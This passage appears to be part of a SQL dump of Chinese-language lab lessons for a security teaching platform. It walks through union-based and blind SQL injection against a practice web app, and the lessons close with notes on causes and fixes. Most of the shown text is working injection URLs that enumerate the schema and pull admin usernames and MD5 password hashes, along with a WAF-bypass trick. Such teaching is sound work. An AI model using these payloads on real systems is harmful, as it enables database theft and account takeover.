src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%871.png\"><br></p><p>2）&nbsp;判断此注入点的字段数</p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1’ order by 1 %23 显示正常</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%872.png\"><br></p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1’ order by 2 %23 显示正常</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%873.png\"><br></p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1’ order by 3 %23 显示正常</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%874.png\"><br></p><p>通过上面的测试说明这语句查询了2个字段的数据显示</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%875.png\" class=\"\"></p><p>3）&nbsp;判断哪个字段是可以返回数据的</p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1’union select 1,2 %23 页面显示数字的地方表示可以返回数据;</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%875.png\"><br></p><p>4）&nbsp;判断数据库版本，当前的数据库名</p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1%27%20union%20select%201,database()%20%23</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%876.png\"><br></p><p>注：database()可替换成其它mysql函数(如:version(),@@basedir等)</p><p>5）&nbsp;注入得到数据库表名</p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1’union select 1,table_name from information_schema.tables where table_schema=0x77656274657374 %23</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%877.png\"><br></p><p>：table_schema=[库名]，库名要转换成16进制。</p><p>6）&nbsp;注入得到数据字段名（列名）</p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1’union select 1,column_name from information_schema.columns where table_name=0x7765625F7573657273 limit 4,1 %23</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%878.png\"><br></p><p></p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1’union select 1,column_name from information_schema.columns where table_name=0x7765625F7573657273 limit 5,1 %23</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%879.png\"><br></p><p>注：table_name=[表名]，表名要转换成16进制。</p><p>7）&nbsp;注入得到表中字段的内容</p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1’union select password,user from web_users limit 1,1 %23</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%8710.png\"><br></p><p>通过上面的过程基本上就可以得到加密的md5密码和对应的管理员账号。通过解密md5基本就可以得到明文的密码。然后找到后台登陆即可。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/sql%E6%A0%871.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-10 18:28:59',1,NULL,'<p>1）&nbsp;Mysql表结构简析</p><p>在讲解这节课之前我们先看一下mysql的表结构。这对于理解sql注入来说有很好的作用。</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps1F22.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%8711.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>打开本地的mysql数据库我们发现mysql里面内置了information_schema这个数据库。这个数据库的功能是为了在查询的时候快速的从内置的表中查到相关的数据，提高了mysql的查询速度。我们可以打开Tables这个表看一下里面的内容。</p><p>在Tables这个表的集合中有很多数据表，我们主要关注tables表和columns</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps1F23.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%8712.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>从tables表中我们可以看到有两个字段table_schema和table_name分别记录了本数据库中所有的数据库名字和数据库中的表名。上一节中的第5条就是利用这个特性来得到相关的数据的：<img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps1F24.tmp.jpg\"></p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%8713.png\"><br></p><p>我们再看下columns表中的结构：</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps1F25.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%8714.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>从上面的截图中可以看到这个表中记录了本数据库中所有的数据库名以及数据库中对应的表名还有表中的详细字段名。上一节中的第6条就是利用这个特性得到相关的数据：<img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps1F26.tmp.jpg\"></p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%8715.png\"><br></p><p>当然关于information_schema数据库中很多信息都是可以用来做sql注入的。比如：<img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps1F27.tmp.jpg\"></p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%8716.png\"><br></p><p>user_privileges这个表可以用来判断当前用户的权限等等。有兴趣的学员可以进一步去学习mysql数据库的相关知识。补充自己在sql注入方面的手工注入能力。</p><p>2）&nbsp;sql注入的原理</p><p>上面我们大概讲解了一下mysql数据库中比较关键的结构这节我们来详细分析为什么这个系统会产生sql注入。</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps1F38.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>首先我们通过上面的源码可以看出系统通过get方式接收到前端的数据以后没有做任何的过滤直接带进由单引号保护的sql语句最后执行mysql_query查询操作。假如前端输入的语句为1’&nbsp;and ‘1’=’2’#那么整条查询语句通过拼接以后就变成了下面的情况。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">SELECT first_name, last_name FROM web_users WHERE user_id = <span class=\"hljs-string\">\'1’ and ‘1’=’2’#\'</span></code></pre><p>在mysql中#表示注释，与此同时还有/* -- 都可以表示注释。</p><p>因为and ‘1’=‘2’永远为false所以上面的语句执行后将得到不到任何内容。</p><p>3）&nbsp;sql注入防范</p><p>针对上面的sql注入情况应该怎么修复呢？</p><p>我们看到既然sql语句做了单引号保护，所以前端接收过来的参数就应该做转义。Php中有专门做转义的函数，mysql_real_escape_string或者addslashes。正常情况下通过转义以后就不能逃逸单引号的保护造成sql注入了。</p><h2>课后拓展</h2><p>方向一：通过查资料了解更多的mysql数据库的特性</p><p>方向二：通过查资料了解除mysql之外的其他数据库比如access,sqlserver等数据库的手工注入语句，从而了解其它数据库的特性。</p><p>方向三：平时多注意练习mysql数据库编程。</p><p><br></p>',1,''),(17,'SQL注入基础训练二','通过攻防教学实验系统中的web系统做简单的sql注入学习，从而理解sql注入的基本原理。','<h1><span style=\"color: inherit; font-family: inherit; font-size: 30px;\">实验步骤：</span><br></h1><p>1）&nbsp;判断注入点</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span> 爆错说明注入存在</code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps9D77.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sql2%E5%9B%BE%E7%89%871.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>根据上面的报错结果我们可以知道这个注入点为整型注入，至于为什么我们后面详细分析的时候讲。</p><p>2）&nbsp;判断此注入点的字段数</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_base/index.php?action=medium&id=<span class=\"hljs-number\">1</span> order by <span class=\"hljs-number\">1</span>  显示正常\r\n\r\nvulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> order by <span class=\"hljs-number\">2</span>  显示正常\r\n\r\nvulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> order by <span class=\"hljs-number\">3</span>  显示错误</code></pre><p>通过上面的测试说明这语句查询了2个字段的数据显示</p><p>3）&nbsp;判断哪个字段是可以返回数据的</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> union select <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>  页面显示数字的地方表示可以返回数据;</code></pre><p>4）&nbsp;判断数据库版本，当前的数据库名</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,database()\r\n\r\n注：database()可替换成其它mysql函数(如:version(),@@basedir等)</code></pre><p>5）&nbsp;注入得到数据库表名</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> union select <span class=\"hljs-number\">1</span>,table_name from information_schema.tables where table_schema=<span class=\"hljs-number\">0x77656274657374</span>\r\n\r\n注：table_schema=[库名]，库名要转换成<span class=\"hljs-number\">16</span>进制。</code></pre><p>6）&nbsp;注入得到数据字段名（列名）</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> union select <span class=\"hljs-number\">1</span>,column_name from information_schema.columns where table_name=<span class=\"hljs-number\">0x7765625F7573657273</span> limit <span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">1</span>\r\n\r\nvulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> union select <span class=\"hljs-number\">1</span>,column_name from information_schema.columns where table_name=<span class=\"hljs-number\">0x7765625F7573657273</span> limit <span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">1</span>\r\n\r\n注：table_name=[表名]，表名要转换成<span class=\"hljs-number\">16</span>进制。</code></pre><p>7）&nbsp;注入得到表中字段的内容</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_base/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span> union select password,user from web_users limit <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span></code></pre><p>通过上面的过程基本上就可以得到加密的md5密码和对应的管理员账号。通过解密md5基本就可以得到明文的密码。然后找到后台登陆即可。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/sql%E6%A0%871.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-11 15:02:20',1,NULL,'<h2>分析与思考</h2><p>1）&nbsp;sql注入的原理</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps9D88.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sql2%E5%9B%BE%E7%89%872.png\"></p><p>通过上面的代码我们可以看出虽然做了过滤可是接收过来的参数却没有用单引号做保护，当成了整型来处理。所以造成了注入。这个地方要说明一下，根据报错结果来判断数据库拼接是怎么做的。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps9D99.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sql2%E5%9B%BE%E7%89%873.png\"></p><p>我们可以看到爆错结果显示多出了\\’有错误。说明这个地方拼接的时候在mysql中不符合语法所以系统爆错。经常写代码的就应该知道这个地方基本上就是没做单引号保护引起的。</p><p>2）&nbsp;sql注入防范</p><p>针对上面的sql注入情况应该怎么修复呢？</p><p>第一种修复方案：直接把前端接收过来的参数强制转换成int型</p><p>第二种修复方案：做单引号保护</p><h2>课后拓展</h2><p>方向一：通过查资料了解更多的mysql数据库的特性</p><p>方向二：通过查资料了解除mysql之外的其他数据库比如access,sqlserver等数据库的手工注入语句，从而了解其它数据库的特性。</p><p></p><p>方向三：平时多注意练习mysql数据库编程。</p><p><br></p>',1,''),(18,'SQL盲注基础训练一','通过攻防教学实验系统中的web系统做sql盲注练习，并且深刻认识掌握其原理，从而理解sql注入在不同场景中的应用。','<h1><span style=\"color: inherit; font-family: inherit; font-size: 30px;\">实验步骤：</span><br></h1><p>1）&nbsp;在WEB系统中通过之前学习的sql注入的方式看看能否得到数据库中的敏感数据</p><p>2）&nbsp;在WEB系统中的参数后面加入恶意字符测试，查看是否报错；下面为盲注得到关键数据的语句，我们直接加单引号看看情况。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps26F1.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%871.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>从图中我们看出没有出现爆错信息，但是页面和没加单引号的时候不一样了。然后我们继续测试。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and \'</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">\'=\'</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' %23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2702.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%872.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and \'</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">\'=\'</span><span class=\"hljs-number\">2</span><span class=\"hljs-string\">\' %23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2703.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%873.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的测试基本可以确定是存在注入的，但是没有爆错信息，所以为盲注。盲注的原理后面详细分析。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and left(version(),1)=4 %23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2704.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%874.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and left(version(),1)=5 %23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2715.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%875.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的可以判断出为5版本的数据库。注意下面的很多语句出现了+。用加好代替了空格，这也是sql注入以后绕过简单waf的一种方式。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and+length(database())=6%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2716.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%876.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and+length(database())=7%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2717.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%877.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and+length(database())=8%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2718.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%878.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的语句基本可以得出数据库的长度为7。实战中我们可以从1开始一直猜测直到出现正确的结果为止。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and+left(database(),1)=\'</span>s<span class=\"hljs-string\">\'%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2719.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%879.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and+left(database(),1)=\'</span>w<span class=\"hljs-string\">\'%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2729.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8710.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>说明数据库的第一个字母为w</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and+left(database(),2)=\'</span>we<span class=\"hljs-string\">\'%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps272A.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8711.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>说明数据库的前两个字母为we。以此类推猜测后面的数据库字母，总共长度为7。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and+left(database(),7)=\'</span>webtest<span class=\"hljs-string\">\'%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps272B.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8712.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>这样就得到了数据库的名字为webtest。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\' and+length((select+table_name+from+information_schema.tables+where +table_schema= 0x77656274657374+limit+1,1))&lt;100%23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps273C.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8713.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>说明表名长度小于100。这个地方可以使用半猜法。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+length((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&lt;<span class=\"hljs-number\">50</span>%<span class=\"hljs-number\">23</span>\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+length((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&lt;<span class=\"hljs-number\">10</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps273D.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8714.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+length((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&lt;<span class=\"hljs-number\">5</span>%<span class=\"hljs-number\">23</span></code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8715.png\"><br></p><p>通过上面办猜法可以知道表的长度在5到10之间，然后在一个一个猜解即可</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+length((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">8</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps273F.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8716.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+length((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">9</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8717.png\" style=\"line-height: 1; max-width: 100%;\"><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2740.tmp.jpg\">&nbsp;</p><p>可以得到表的长度为9。其中0x77656274657374为数据库名webtest的16进制形式。下面我们开始猜解数据表的具体名字。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+left((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">1</span>)=%<span class=\"hljs-number\">27</span>a%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2741.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8718.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+left((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">1</span>)=%<span class=\"hljs-number\">27</span>b%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">23</span>\r\n\r\n………………\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+left((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">1</span>)=%<span class=\"hljs-number\">27</span>w%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2742.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8719.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">vulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+left((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">2</span>)=%<span class=\"hljs-number\">27</span>we%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2743.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8720.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">………………\r\n\r\nvulnerabilities/web/Sql/sqli_blind/index.php?id=<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">and</span>+left((select+table_name+from+information_schema.tables+where%<span class=\"hljs-number\">20</span>+table_schema=%<span class=\"hljs-number\">200</span>x77656274657374+limit+<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>),<span class=\"hljs-number\">9</span>)=%<span class=\"hljs-number\">27</span>web_users%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps2744.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlm1%E5%9B%BE%E7%89%8721.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的猜测最终得到表名为web_users。注意到limit 